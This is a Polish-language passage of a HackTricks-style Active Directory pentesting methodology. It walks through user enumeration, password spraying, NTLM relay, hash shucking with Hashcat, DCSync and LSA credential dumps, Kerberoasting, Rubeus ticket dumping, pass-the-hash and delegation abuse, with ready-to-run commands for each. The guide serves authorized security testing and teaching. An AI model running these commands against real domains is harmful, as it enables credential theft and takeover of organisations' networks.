# Metodologia Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Podstawowy przegląd

**Active Directory** służy jako podstawowa technologia, umożliwiająca **administratorom sieci** efektywne tworzenie i zarządzanie **domenami**, **użytkownikami** oraz **obiektami** w sieci. Została zaprojektowana tak, aby skalować się, ułatwiając organizowanie dużej liczby użytkowników w zarządzalne **grupy** i **podgrupy**, jednocześnie kontrolując **prawa dostępu** na różnych poziomach.

Struktura **Active Directory** składa się z trzech głównych warstw: **domen**, **trees** i **forests**. **Domena** obejmuje zbiór obiektów, takich jak **użytkownicy** czy **urządzenia**, współdzielących wspólną bazę danych. **Trees** to grupy tych domen powiązane wspólną strukturą, a **forest** reprezentuje zbiór wielu trees, połączonych poprzez **trust relationships**, tworząc najwyższy poziom struktury organizacyjnej. Specyficzne **prawa dostępu** i **komunikacji** mogą być nadawane na każdym z tych poziomów.

Kluczowe pojęcia w **Active Directory** to:

1. **Directory** – Zawiera wszystkie informacje dotyczące obiektów Active Directory.
2. **Object** – Oznacza byty w katalogu, w tym **użytkowników**, **grupy** lub **udostępnione foldery**.
3. **Domain** – Służy jako kontener dla obiektów katalogu; w **forest** może istnieć wiele domen, z których każda posiada własny zestaw obiektów.
4. **Tree** – Grupowanie domen, które dzielą wspólną domenę nadrzędną.
5. **Forest** – Najwyższy poziom struktury organizacyjnej w Active Directory, składający się z kilku trees z **trust relationships** między nimi.

**Active Directory Domain Services (AD DS)** obejmuje szereg usług kluczowych dla scentralizowanego zarządzania i komunikacji w sieci. Usługi te obejmują:

1. **Domain Services** – Centralizuje przechowywanie danych i zarządza interakcjami między **użytkownikami** a **domenami**, w tym **uwierzytelnianiem** i funkcjami **wyszukiwania**.
2. **Certificate Services** – Zarządza tworzeniem, dystrybucją i zarządzaniem bezpiecznymi **certyfikatami cyfrowymi**.
3. **Lightweight Directory Services** – Wspiera aplikacje korzystające z katalogu przez protokół **LDAP**.
4. **Directory Federation Services** – Zapewnia funkcje **single-sign-on** do uwierzytelniania użytkowników w wielu aplikacjach webowych w jednej sesji.
5. **Rights Management** – Pomaga chronić materiały objęte prawami autorskimi, regulując ich nieautoryzowaną dystrybucję i użycie.
6. **DNS Service** – Kluczowy dla rozwiązywania **nazw domen**.

Po więcej szczegółów zobacz: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Aby nauczyć się, jak **atakować AD**, musisz bardzo dobrze **zrozumieć** proces **Kerberos authentication**.\
[**Przeczytaj tę stronę, jeśli nadal nie wiesz jak to działa.**](kerberos-authentication.md)

## Skrócony przewodnik

Możesz skorzystać z [https://wadcoms.github.io/](https://wadcoms.github.io) aby szybko zobaczyć które komendy możesz uruchomić do enumeracji/eksploatacji AD.

> [!WARNING]
> Komunikacja Kerberos **wymaga pełnej kwalifikowanej nazwy (FQDN)** do wykonywania akcji. Jeśli spróbujesz uzyskać dostęp do maszyny po adresie IP, **zostanie użyty NTLM, a nie Kerberos**.

## Recon Active Directory (No creds/sessions)

Jeśli masz dostęp do środowiska AD, ale nie masz żadnych poświadczeń/sesji, możesz:

- **Pentest the network:**
- Skanuj sieć, znajdź maszyny i otwarte porty i spróbuj **exploit vulnerabilities** lub **extract credentials** z nich (na przykład, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumeracja DNS może dać informacje o kluczowych serwerach w domenie, takich jak web, printers, shares, vpn, media itp.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Zerknij do ogólnej [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md), aby znaleźć więcej informacji jak to robić.
- **Check for null and Guest access on smb services** (to nie zadziała na nowoczesnych wersjach Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Szczegółowy przewodnik jak enumerować serwer SMB znajdziesz tutaj:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Szczegółowy przewodnik jak enumerować LDAP znajdziesz tutaj (zwróć **szczególną uwagę na anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Zbieraj poświadczenia przez [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Uzyskaj dostęp do hosta przez [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Zbieraj poświadczenia **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Wyodrębnij nazwy użytkowników/imiona z dokumentów wewnętrznych, social media, serwisów (głównie web) wewnątrz środowiska domeny, jak również z zasobów publicznie dostępnych.
- Jeśli znajdziesz pełne imiona i nazwiska pracowników firmy, możesz spróbować różnych konwencji tworzenia nazw użytkowników AD (**read this**). Najczęstsze konwencje to: _NameSurname_, _Name.Surname_, _NamSur_ (3 litery z każdego), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _losowe litery i 3 losowe cyfry_ (abc123).
- Narzędzia:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Sprawdź strony [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) oraz [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Gdy zostanie podany **nieprawidłowy username**, serwer odpowie kodem błędu **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, co pozwala ustalić, że nazwa użytkownika była nieprawidłowa. **Prawidłowe nazwy użytkowników** wywołają albo **TGT w odpowiedzi AS-REP**, albo błąd _KRB5KDC_ERR_PREAUTH_REQUIRED_, wskazujący, że użytkownik musi wykonać pre-authentication.
- **No Authentication against MS-NRPC**: Użycie auth-level = 1 (No authentication) wobec interfejsu MS-NRPC (Netlogon) na kontrolerach domeny. Metoda wywołuje funkcję `DsrGetDcNameEx2` po związaniu interfejsu MS-NRPC, aby sprawdzić czy użytkownik lub komputer istnieje bez jakichkolwiek poświadczeń. Narzędzie [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementuje tego typu enumerację. Badania dostępne są [tutaj](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Jeśli znajdziesz jeden z tych serwerów w sieci, możesz również przeprowadzić **user enumeration przeciwko niemu**. Na przykład możesz użyć narzędzia [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Możesz znaleźć listy nazw użytkowników w [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  i w tym ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Jednak powinieneś mieć **imiona osób pracujących w firmie** z etapu recon, który powinieneś był wykonać wcześniej. Mając imię i nazwisko możesz użyć skryptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) do wygenerowania potencjalnych poprawnych nazw użytkowników.

### Knowing one or several usernames

Ok, masz już poprawną nazwę użytkownika, ale nie masz haseł... Spróbuj wtedy:

- [**ASREPRoast**](asreproast.md): Jeśli użytkownik **nie ma** atrybutu _DONT_REQ_PREAUTH_ możesz **zażądać AS_REP message** dla tego użytkownika, która będzie zawierać dane zaszyfrowane pochodną hasła użytkownika.
- [**Password Spraying**](password-spraying.md): Wypróbuj najbardziej **powszechne hasła** dla każdego z odnalezionych użytkowników — być może któryś użytkownik używa słabego hasła (pamiętaj o polityce haseł!).
- Zauważ, że możesz także **spray OWA servers** aby spróbować uzyskać dostęp do serwerów pocztowych użytkowników.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Możesz być w stanie **uzyskać** pewne challenge **hashes**, które można złamać poprzez **poisoning** niektórych protokołów **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Jeśli udało ci się zenumerować active directory, będziesz miał więcej adresów e-mail i lepsze zrozumienie sieci. Możesz być w stanie wymusić NTLM **relay attacks**, aby uzyskać dostęp do AD env.

### NetExec workspace-driven recon & relay posture checks

- Użyj **`nxcdb` workspaces** aby przechowywać stan AD recon dla każdego engagementu: `workspace create <name>` tworzy per-protocol SQLite DBs w `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Przełączaj widoki za pomocą `proto smb|mssql|winrm` i wyświetl zebrane secrets poleceniem `creds`. Ręcznie usuń wrażliwe dane po zakończeniu: `rm -rf ~/.nxc/workspaces/<name>`.
- Szybkie wykrywanie podsieci za pomocą **`netexec smb <cidr>`** ujawnia **domain**, **OS build**, **SMB signing requirements**, oraz **Null Auth**. Hosty pokazujące `(signing:False)` są **relay-prone**, podczas gdy DCs często wymagają podpisywania.
- Generuj **hostnames in /etc/hosts** bezpośrednio z outputu NetExec, aby ułatwić targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Gdy **SMB relay to the DC is blocked** przez signing, nadal warto sprawdzić postawę **LDAP**: `netexec ldap <dc>` zaznacza `(signing:None)` / weak channel binding. DC z wymaganym SMB signing, ale z wyłączonym LDAP signing pozostaje realnym celem **relay-to-LDAP** do nadużyć takich jak **SPN-less RBCD**.

### Po stronie klienta printer credential leaks → masowa walidacja poświadczeń domeny

- Interfejsy drukarek/webowe UI czasami **osadzają zamaskowane hasła administratora w HTML**. Przeglądanie źródła/devtools może ujawnić tekst jawny (np. `<input value="<password>">`), pozwalając na dostęp Basic-auth do repozytoriów skanów/druków.
- Pobierane zadania drukowania mogą zawierać **plaintext onboarding docs** z indywidualnymi hasłami użytkowników. Podczas testów zachowaj zgodność powiązań:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Kradzież poświadczeń NTLM

Jeśli możesz uzyskać dostęp do innych PC lub udziałów z użytkownikiem null lub guest, możesz umieścić pliki (np. plik SCF), które po otwarciu spowodują wyzwolenie uwierzytelnienia NTLM przeciwko Tobie, dzięki czemu możesz przechwycić NTLM challenge i je złamać:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

Hash shucking traktuje każdy NT hash, który już posiadasz, jako kandydat na hasło dla innych, wolniejszych formatów, których materiał klucza jest bezpośrednio pochodną NT hasha. Zamiast brute-force’ować długie frazy hasłowe w Kerberos RC4 tickets, NetNTLM challenges lub cached credentials, podajesz NT hashe do trybów NT-candidate w Hashcat i pozwalasz mu zweryfikować ponowne użycie hasła bez poznawania plaintextu. Jest to szczególnie skuteczne po kompromitacji domeny, gdy możesz zebrać tysiące bieżących i historycznych NT hashy.

Użyj shuckingu gdy:

- Masz korpus NT z DCSync, zrzutów SAM/SECURITY lub vaultów poświadczeń i musisz sprawdzić ponowne użycie w innych domenach/leśnych.
- Przechwycisz materiał Kerberos oparty na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), odpowiedzi NetNTLM lub bloby DCC/DCC2.
- Chcesz szybko udowodnić ponowne użycie dla długich, niełamalnych fraz hasłowych i natychmiast pivotować przez Pass-the-Hash.

Technika nie działa przeciwko typom szyfrowania, których klucze nie są NT hashem (np. Kerberos etype 17/18 AES). Jeśli domena wymusza tylko AES, musisz wrócić do standardowych trybów hasła.

#### Budowanie korpusu NT hashy

- **DCSync/NTDS** – Użyj `secretsdump.py` z historią, aby zgarnąć jak największy zestaw NT hashy (i ich poprzednich wartości):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Wpisy historyczne znacznie poszerzają pulę kandydatów, ponieważ Microsoft może przechowywać do 24 poprzednich hashy na konto. Po więcej sposobów na zebranie sekretów NTDS patrz:

{{#ref}}
dcsync.md
{{#endref}}

- **Zrzuty cache na endpointach** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (lub Mimikatz `lsadump::sam /patch`) wyciąga lokalne dane SAM/SECURITY oraz cached domain logons (DCC/DCC2). Usuń duplikaty i dopisz te hashe do tego samego pliku `nt_candidates.txt`.
- **Śledź metadata** – Przechowuj nazwę użytkownika/domeny, która wygenerowała każdy hash (nawet jeśli słownik zawiera tylko hex). Dopasowanie hashy od razu mówi, który principal ponownie używa hasła, gdy Hashcat wypisze zwycięskiego kandydata.
- Preferuj kandydatów z tego samego lasu lub z lasu zaufanego; maksymalizuje to szansę pokrycia przy shuckingu.

#### Tryby NT-candidate w Hashcat

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Uwagi:

- Wejścia NT-candidate muszą pozostać surowymi 32-hex NT hashami. Wyłącz silniki reguł (bez `-r`, bez trybów hybrydowych), ponieważ modyfikacje uszkadzają materiał klucza kandydata.
- Te tryby nie są z natury szybsze, ale przestrzeń kluczy NTLM (~30,000 MH/s na M3 Max) jest ~100× szybsza niż Kerberos RC4 (~300 MH/s). Testowanie skuratorowanej listy NT jest znacznie tańsze niż eksploracja całej przestrzeni haseł w wolnym formacie.
- Zawsze uruchamiaj najnowszy build Hashcat (`git clone https://github.com/hashcat/hashcat && make install`), ponieważ tryby 31500/31600/35300/35400 pojawiły się niedawno.
- Obecnie nie ma trybu NT dla AS-REQ Pre-Auth, a AES etypes (19600/19700) wymagają plaintextu, ponieważ ich klucze są wyprowadzone przez PBKDF2 z UTF-16LE haseł, a nie z surowych NT hashy.

#### Przykład – Kerberoast RC4 (mode 35300)

1. Przechwyć RC4 TGS dla docelowego SPN używając użytkownika o niskich uprawnieniach (szczegóły na stronie Kerberoast):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuckuj ticket używając swojej listy NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat wyprowadza klucz RC4 z każdego NT kandydata i weryfikuje blob `$krb5tgs$23$...`. Dopasowanie potwierdza, że konto serwisowe używa jednego z posiadanych NT hashy.

3. Natychmiast pivotuj przez PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Opcjonalnie możesz później odzyskać plaintext za pomocą `hashcat -m 1000 <matched_hash> wordlists/` jeśli zajdzie potrzeba.

#### Przykład – Cached credentials (mode 31600)

1. Zrzutuj cached logons z kompromitowanej stacji roboczej:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Skopiuj linię DCC2 dla interesującego użytkownika domenowego do `dcc2_highpriv.txt` i shuckuj ją:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Udane dopasowanie ujawnia NT hash już znany z Twojej listy, co dowodzi, że cached user ponownie używa hasła. Użyj go bezpośrednio do PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) lub złam go w szybkim trybie NTLM, aby odzyskać ciąg.

Dokładnie taki sam workflow ma zastosowanie do NetNTLM challenge-response (`-m 27000/27100`) i DCC (`-m 31500`). Po zidentyfikowaniu dopasowania możesz uruchomić relay, SMB/WMI/WinRM PtH lub ponownie złamać NT hash za pomocą masek/reguł offline.

## Enumeracja Active Directory Z poświadczeniami/session

W tej fazie musisz mieć skompromitowane poświadczenia lub sesję ważnego konta domenowego. Jeśli masz jakieś ważne poświadczenia lub shell jako użytkownik domenowy, pamiętaj, że opcje podane wcześniej nadal pozostają opcjami do kompromitacji innych użytkowników.

Zanim rozpoczniesz uwierzytelnioną enumerację powinieneś znać problem double hop Kerberosa.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeracja

Skompromitowanie konta to duży krok w stronę kompromitacji całej domeny, ponieważ będziesz mógł rozpocząć Active Directory Enumeration:

W odniesieniu do [**ASREPRoast**](asreproast.md) możesz teraz znaleźć każde możliwe podatne konto, a jeśli chodzi o [**Password Spraying**](password-spraying.md) możesz uzyskać listę wszystkich nazw użytkowników i spróbować hasła skompromitowanego konta, pustych haseł lub nowych obiecujących haseł.

- Możesz użyć [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Możesz też użyć [**powershell for recon**](../basic-powershell-for-pentesters/index.html), co będzie bardziej stealthy
- Możesz także [**use powerview**](../basic-powershell-for-pentesters/powerview.md) aby wyciągnąć bardziej szczegółowe informacje
- Kolejnym świetnym narzędziem do recon w Active Directory jest [**BloodHound**](bloodhound.md). Nie jest ono bardzo stealthy (zależnie od metod zbierania), ale jeśli Ci na tym nie zależy, zdecydowanie warto spróbować. Znajdź gdzie użytkownicy mogą RDP, znajdź ścieżki do innych grup itd.
- **Inne zautomatyzowane narzędzia do enumeracji AD to:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**Rekordy DNS AD**](ad-dns-records.md) mogą zawierać interesujące informacje.
- Narzędzie z GUI, którego możesz użyć do enumeracji katalogu, to **AdExplorer.exe** z pakietu **SysInternal**.
- Możesz też przeszukać bazę LDAP za pomocą **ldapsearch**, aby szukać poświadczeń w polach _userPassword_ & _unixUserPassword_, lub nawet w _Description_. por. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) dla innych metod.
- Jeśli używasz **Linux**, możesz też enumerować domenę używając [**pywerview**](https://github.com/the-useless-one/pywerview).
- Możesz też spróbować zautomatyzowanych narzędzi takich jak:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Wyciąganie wszystkich użytkowników domeny**

Bardzo łatwo jest uzyskać wszystkie nazwy użytkowników domeny z Windows (`net user /domain` ,`Get-DomainUser` lub `wmic useraccount get name,sid`). W Linuxie możesz użyć: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` lub `enum4linux -a -u "user" -p "password" <DC IP>`

> Nawet jeśli sekcja Enumeracja wygląda krótko, to jest to najważniejsza część wszystkiego. Otwórz linki (głównie te do cmd, powershell, powerview i BloodHound), naucz się jak enumerować domenę i ćwicz, aż poczujesz się pewnie. Podczas testu to będzie kluczowy moment, aby znaleźć drogę do DA lub zdecydować, że nic nie da się zrobić.

### Kerberoast

Kerberoasting polega na uzyskaniu TGS tickets używanych przez usługi powiązane z kontami użytkowników i łamaniu ich szyfrowania — które opiera się na hasłach użytkowników — offline.

Więcej na ten temat w:

{{#ref}}
kerberoast.md
{{#endref}}

### Zdalne połączenie (RDP, SSH, FTP, Win-RM, itd.)

Gdy uzyskasz poświadczenia możesz sprawdzić, czy masz dostęp do jakiejkolwiek maszyny. W tym celu możesz użyć **CrackMapExec** aby próbować łączyć się z kilkoma serwerami przy pomocy różnych protokołów, zgodnie z wynikami skanów portów.

### Lokalna eskalacja uprawnień

Jeśli masz skompromitowane poświadczenia lub sesję jako zwykły użytkownik domenowy i masz dostęp tym użytkownikiem do jakiejkolwiek maszyny w domenie, powinieneś spróbować znaleźć sposób na eskalację uprawnień lokalnie i zebrać poświadczenia. Tylko z lokalnymi uprawnieniami administratora będziesz w stanie zrzucać hashe innych użytkowników z pamięci (LSASS) i lokalnie (SAM).

W tej książce jest oddzielna strona o [**lokalnej eskalacji uprawnień w Windows**](../windows-local-privilege-escalation/index.html) oraz [**checklista**](../checklist-windows-privilege-escalation.md). Również nie zapomnij użyć [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Bieżące bilety sesji

Bardzo mało prawdopodobne jest, że znajdziesz bilety w bieżącym użytkowniku dające Ci uprawnienia do dostępu do nieoczekiwanych zasobów, ale możesz sprawdzić:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Teraz, gdy masz podstawowe poświadczenia powinieneś sprawdzić, czy możesz **znaleźć** jakieś **interesujące pliki udostępnione w AD**. Możesz to robić ręcznie, ale to bardzo nudne, powtarzalne zadanie (zwłaszcza jeśli znajdziesz setki dokumentów do sprawdzenia).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Jeśli możesz **dostępować do innych PC lub shares** możesz **umieścić pliki** (np. plik SCF), które jeśli zostaną w jakiś sposób otwarte **spowodują NTLM authentication przeciwko tobie**, dzięki czemu możesz **ukraść** **NTLM challenge** aby go złamać:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ta podatność pozwalała dowolnemu uwierzytelnionemu użytkownikowi **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Dla poniższych technik zwykły użytkownik domenowy nie wystarczy — potrzebujesz specjalnych uprawnień/credentials, by wykonać te ataki.**

### Hash extraction

Miejmy nadzieję, że udało Ci się **compromise some local admin** konto używając [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) łącznie z relayingiem, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Następnie czas zrzucić wszystkie hashe z pamięci i lokalnie.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Musisz użyć jakiegoś narzędzia, które **wykona NTLM authentication używając** tego **hasha**, **lub** możesz stworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, tak że gdy zostanie wykonana jakakolwiek **NTLM authentication**, będzie użyty ten **hash**. Ostatnia opcja to to, co robi mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak ma na celu **użyć user NTLM hash do zażądania Kerberos tickets**, jako alternatywa do powszechnego Pass The Hash przez protokół NTLM. Dlatego może być szczególnie **przydatny w sieciach, gdzie protokół NTLM jest wyłączony** i tylko **Kerberos jest dozwolony** jako protokół uwierzytelniania.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną authentication ticket użytkownika** zamiast jego hasła lub wartości hash. Skradziony ticket jest następnie używany, by **podszyć się pod użytkownika**, uzyskując nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Jeśli masz **hash** lub **password** **local administratora**, powinieneś spróbować **zalogować się lokalnie** na innych **PCs** używając tych poświadczeń.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Zwróć uwagę, że to jest dość **głośne** i **LAPS** **by to złagodził**.

### Nadużycia MSSQL i zaufane linki

Jeśli użytkownik ma uprawnienia do **access MSSQL instances**, może je wykorzystać do **execute commands** na hoście MSSQL (jeśli działa jako SA), **steal** NetNTLM **hash** lub nawet przeprowadzić **relay attack**.\
Ponadto, jeśli instancja MSSQL jest zaufana (database link) przez inną instancję MSSQL i użytkownik ma uprawnienia do zaufanej bazy danych, będzie w stanie **use the trust relationship to execute queries also in the other instance**. Zaufania te mogą być łańcuchowane i w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, w której będzie mógł wykonywać polecenia.\
**Połączenia między bazami działają nawet przez zaufania lasu.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Nadużycia platform do inwentaryzacji i wdrożeń IT

Zewnętrzne suite do inwentaryzacji i deploymentu często udostępniają potężne ścieżki do poświadczeń i wykonania kodu. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz dowolny obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz uprawnienia domenowe na tym komputerze, będziesz w stanie zrzucić TGTs z pamięci każdego użytkownika, który się na nim zaloguje.\
Zatem, jeśli **Domain Admin logins onto the computer**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego używając [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation możesz nawet **automatycznie przejąć Print Server** (oby to był DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma zezwolenie na "Constrained Delegation", będzie w stanie **impersonate any user to access some services in a computer**.\
Następnie, jeśli **compromise the hash** tego użytkownika/komputera, będziesz w stanie **impersonate any user** (nawet domain admins) aby uzyskać dostęp do pewnych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia uzyskanie wykonania kodu z **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Nadużycie uprawnień/ACLów

Skompromitowany użytkownik może mieć pewne **interesujące uprawnienia nad niektórymi obiektami domeny**, które mogą pozwolić na **ruch boczny / eskalację uprawnień**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Nadużycie usługi Printer Spooler

Odkrycie aktywnej usługi **Spool** w domenie może zostać **nadużyte** w celu **pozyskania nowych poświadczeń** i **eskalacji uprawnień**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Nadużycie sesji użytkowników trzecich

Jeśli **inni użytkownicy** **dostępają** do **skompro­mitowanego** komputera, możliwe jest **gather credentials from memory** i nawet **inject beacons in their processes** aby podszyć się pod nich.\
Zwykle użytkownicy łączą się przez RDP, więc poniżej opisano kilka ataków na sesje RDP osób trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

